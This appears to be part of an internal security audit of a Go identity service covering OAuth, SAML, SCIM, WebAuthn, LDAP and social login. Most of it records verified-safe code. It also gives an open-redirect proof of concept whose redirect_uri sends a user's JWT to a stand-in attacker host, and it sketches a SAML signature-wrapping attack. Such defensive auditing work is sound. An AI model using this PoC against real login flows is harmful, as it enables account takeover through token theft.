**Code:** `services/oauth/internal/service/oauth_service.go:1743-1804`, `services/oauth/internal/service/logout.go:111-137`

The backchannel logout token validation is well-implemented:
1. **JWT signature verification** — Uses `s.keyProvider.Public()` (line 1745-1755)
2. **Required claims** — Sub or sid (line 1766), events with backchannel-logout URI (line 1777)
3. **Nonce rejection** — Rejects tokens with nonce (line 1782)
4. **JTI replay prevention** — Redis SetNX or in-memory check (line 1788-1801)

The old `/oauth/logout` endpoint (server.go:1024-1066) correctly uses `ParseBackchannelLogoutToken` (line 1038).

### Verified Safe: OIDC UserInfo Endpoint

**Code:** `services/oauth/internal/service/introspection.go:11-55`, `services/oauth/internal/server/server.go:998-1021`

The UserInfo endpoint:
1. Requires Bearer token (line 1006-1011)
2. Checks token revocation before serving claims (introspection.go:13)
3. Filters claims by scope — `profile` scope for name/picture, `email` scope for email (line 37-46)
4. Always returns tenant_id, roles, groups, permissions (line 49-53) — these are token-embedded claims, not additional DB lookups

### Verified Safe: PAR (RFC 9126)

**Code:** `services/oauth/internal/service/par.go:92-158`

PAR implementation:
1. Validates client and secret (line 94-105)
2. Validates redirect_uri is registered (line 108)
3. Validates response_type is supported (line 113-122)
4. Single-use — `GetPushedAuthorizationRequest` deletes after retrieval (line 156)
5. TTL enforcement (line 150-153)

### Verified Safe: Client Management — filterSafeScopes Applied

**Code:** `services/oauth/internal/service/oauth_service.go:181, 347`, `services/oauth/internal/service/dcr.go:53-67`

The recent `filterSafeScopes` fix (commit f41f68742) correctly uses case-insensitive comparison:
- `CreateClient` (line 181): `input.Scopes = filterSafeScopes(input.Scopes)`
- `UpdateClientMetadata` (line 347): `client.Scopes = filterSafeScopes(updates.Scopes)`
- DCR (dcr.go:53-67): Separate inline filter with case-insensitive check

The filter blocks `admin`, `platform:`, `tenant:` prefixes (case-insensitive). No bypass path identified.

---

## Attack Surface #4: Identity Federation (Round 6) — 2026-08-04

### Summary

Audited SAML XSW protection, social login redirect URI validation, SCIM filter/PATCH/bulk, WebAuthn passkey cross-tenant, and LDAP injection. Found 1 confirmed P1 (open redirect in social login), 2 NEEDS-VERIFY issues, and several verified-secure areas.

---

### P1-6: Social Login `isAllowedRedirectURI` — Open Redirect via Arbitrary HTTPS Host (Confirmed)

**Severity:** P1 (High)
**CVSS:** 7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H)

**File:** `services/auth/internal/server/social_handler.go:43-58`

**Root cause:**

The `isAllowedRedirectURI` function only validates:
1. Scheme is `https` (or localhost)
2. Host is non-empty

It does **NOT** validate the host against any configured allowlist. Any HTTPS URL is accepted as a redirect target.

```go
func isAllowedRedirectURI(uri string) bool {
    parsed, err := url.Parse(uri)
    if err != nil { return false }
    if parsed.Scheme != "https" {
        if parsed.Host != "localhost" && !strings.HasPrefix(parsed.Host, "localhost:") {
            return false
        }
    }
    if parsed.Host == "" { return false }
    return true  // <-- Any https:// host passes!
}
```

**Attack path:**

1. Attacker initiates social login: `GET /api/v1/auth/social/google?redirect_uri=https://evil.example.com/auth/callback`
2. `isAllowedRedirectURI("https://evil.example.com/auth/callback")` returns `true` (scheme is https, host is non-empty)
3. After successful OAuth, the `handleSocialCallback` handler redirects with JWT in URL fragment:
   ```go
   redirectURL := fmt.Sprintf("%s#access_token=%s&token_type=Bearer&provider=%s", frontendURL, token, provider)
   http.Redirect(w, r, redirectURL, http.StatusFound)
   ```
4. User's browser is redirected to `https://evil.example.com/auth/callback#access_token=<JWT>&token_type=Bearer&provider=google`
5. Attacker-controlled site receives the JWT fragment (via JS reading `window.location.hash`)

**Impact:** Account takeover via token theft. An attacker who tricks a user into clicking a crafted social login link can redirect the user's JWT to an attacker-controlled server.

**PoC:**
```
GET /api/v1/auth/social/google?redirect_uri=https://attacker.example.com/capture&X-Tenant-ID=<valid_tenant>
```
After OAuth flow completes, browser redirects to `https://attacker.example.com/capture#access_token=eyJ...`

**Fix recommendation:** Validate redirect_uri against a server-side configured allowlist of trusted callback domains (e.g., from `sys_config` or env var `GGID_ALLOWED_REDIRECT_URIS`).

---

### NEEDS-VERIFY-1: SAML XSW — No Response-Level Signature Verification

**Severity:** NEEDS-VERIFY (potential P1 if IdP signs Response but not Assertion)

**File:** `pkg/saml/assertion.go:219-237`, `services/auth/internal/server/saml_handler.go:121-127`

**Observation:**

The SAML ACS handler calls `ExtractAssertionFromResponse` which extracts the first `<Assertion>` from the Response envelope, then calls `VerifySignedAssertion` on the extracted assertion XML. This verifies:
- The assertion has a valid XML signature
- The signature is a direct child of `<Assertion>` (XSW protection via `validateSignaturePlacement`)
- The digest matches (enveloped signature transform via `stripEnvelopedSignature`)
- The cryptographic signature verifies against the IdP certificate

However, the **Response envelope itself is never signature-verified**. The code only verifies the assertion-level signature.

**XSW attack scenario (needs verification against actual IdP behavior):**

If the IdP signs the Response (not the Assertion), an attacker could:
1. Capture a valid signed Response from the IdP
2. Remove the original assertion and inject a forged assertion with attacker-chosen attributes
3. Submit to ACS — `ExtractAssertionFromResponse` extracts the forged assertion, `VerifySignedAssertion` fails because the forged assertion has no valid signature

This attack is **blocked** because `VerifySignedAssertion` requires a valid signature on the assertion itself. The code correctly rejects unsigned assertions.

**Remaining concern:** If the IdP signs both Response AND Assertion, and an attacker performs a signature wrapping attack where:
- The attacker wraps a valid signed assertion inside a forged outer Response
- `ExtractAssertionFromResponse` extracts the signed assertion (which passes verification)
- But the attacker manipulates the Response-level attributes (Destination, InResponseTo)

The code does validate `InResponseTo` (rejects non-empty values since no SP-initiated flow exists) and uses assertion conditions (audience, time window). The Response Destination is not validated.

**Conclusion:** The assertion-level signature verification with XSW placement check is sound. The missing Response-level signature verification is a defense-in-depth gap but not directly exploitable given the current assertion verification. NEEDS-VERIFY: confirm with actual IdP configurations whether any IdP signs only the Response (not the Assertion).

---

### NEEDS-VERIFY-2: SCIM `parseSCIMFilter` — Limited Filter Parsing Allows Bypass

**Severity:** NEEDS-VERIFY (low severity — no SQL injection, but filter bypass)

**File:** `services/identity/internal/scim/handler.go:865-881`

**Observation:**

The `parseSCIMFilter` function only supports a very narrow SCIM filter syntax: `<attr> eq "<value>"`. It uses string matching (case-insensitive) to find the attribute prefix, then extracts the quoted value.

```go
func parseSCIMFilter(filter, attrName string) string {
    lower := strings.ToLower(filter)
    prefix := strings.ToLower(attrName) + " eq"
    idx := strings.Index(lower, prefix)
    // ...extracts quoted value after prefix...
}
```

**Limitations:**
- Only `eq` operator is supported — `co`, `sw`, `ew`, `pr`, `gt`, `lt`, `ge`, `le` are ignored
- Complex filters with `and`/`or` are not parsed
- If no match, `searchQuery` is empty → `ListUsers` returns ALL users in the tenant

This is not a SQL injection risk (the extracted value is passed as a parameterized search query), but it means SCIM filter queries silently fall through to "return all users" for any non-`eq` filter. This is a functional/SCIM compliance issue, not a security vulnerability — the tenant isolation in `ListUsers` still applies.

**Conclusion:** Not a security vulnerability. The filter bypass only returns all tenant-scoped users, which is the same as no filter. No cross-tenant data exposure.

---

### Verified Secure Areas

**1. SAML Assertion Signature Verification (P1-5 fix confirmed)**
- `VerifySignedAssertion` in `pkg/saml/signed_assertion.go:386-433` properly verifies:
  - Signature placement (direct child of Assertion) — blocks XSW
  - Digest value matches (enveloped signature transform)
  - Cryptographic signature against IdP certificate
  - Time conditions and audience restriction
- `ExtractAssertionFromResponse` correctly extracts the first assertion and validates Response status is Success
- InResponseTo validation rejects unexpected values (replay protection)
- Assertion ID replay protection via Redis SETNX with TTL (fail-closed if Redis unavailable)

**2. WebAuthn Passkey Cross-Tenant Isolation**
- `finishAuthentication` in `services/auth/internal/webauthn/handler.go:884-893` verifies `cred.TenantID != tenantID` and rejects with 403
- `finishRegistration` stores `TenantID` in credential record (line 707)
- Challenge is atomically consumed via `sessions.getAndDelete()` (line 866-867) — prevents replay
- Clone detection via signCount monotonicity check (line 920-931)
- `handlePasskeyRevoke` uses `WHERE id = $1 AND tenant_id = $2` — tenant-scoped deletion
- `handlePasskeyStatus` uses `WHERE revoked = false AND tenant_id = $1` — no cross-tenant leak

**3. WebAuthn Passwordless Endpoint — Properly Disabled**
- `handleWebAuthnPasswordlessFinish` returns 501 at line 157: `"webauthn passwordless login is not yet implemented"`
- No authentication bypass possible — endpoint is fail-closed

**4. LDAP Search Filter Injection — Properly Escaped**
- `pkg/authprovider/ldap.go:160`: `filter := fmt.Sprintf(p.cfg.UserFilter, ldap.EscapeFilter(username))`
- `ldap.EscapeFilter` escapes `*`, `(`, `)`, `\`, NUL — prevents LDAP injection
- Group-to-role mapping is config-driven (no user input in mapping logic)

**5. Social Login State/CSRF Protection**
- State parameter is UUID-generated, stored in `socialStates` with 5-min TTL
- `handleSocialCallback` validates state exists, matches provider, and is atomically deleted (line 190)
- JIT provisioning checks `info.EmailVerified` before email-based account linking (P2-13 fix confirmed)
- External identity lookup is tenant-scoped: `WHERE user_id IN (SELECT id FROM users WHERE tenant_id = $3)`

**6. SCIM Token Auth Middleware**
- SCIM token auth applies to both `/scim/v2/` and `/api/v1/scim/` aliases
- Token is HMAC-SHA256 hashed (not stored in plaintext)
- Tenant context from token overrides X-Tenant-ID header
- JWT admin bypass on aliases requires `GGID_INTERNAL_SECRET` verification
- `hashSCIMToken` fails-closed if `GGID_INTERNAL_SECRET` is not set

**7. SCIM PATCH Path — No Injection**
- `patchUser` in `handler.go:640-705` uses exact string matching on `op.Path` (`"displayname"`, `"active"`)
- No SQL or JSONPath injection possible — path is compared, not interpolated
- Values are JSON-unmarshaled into typed variables (string, bool)

**8. SCIM Bulk Operations — Properly Limited**
- `maxBulkOperations = 1000` limit enforced (bulk.go:66-69)
- `failOnErrors` threshold respected
- Operations are executed sequentially via `executeBulkOp`
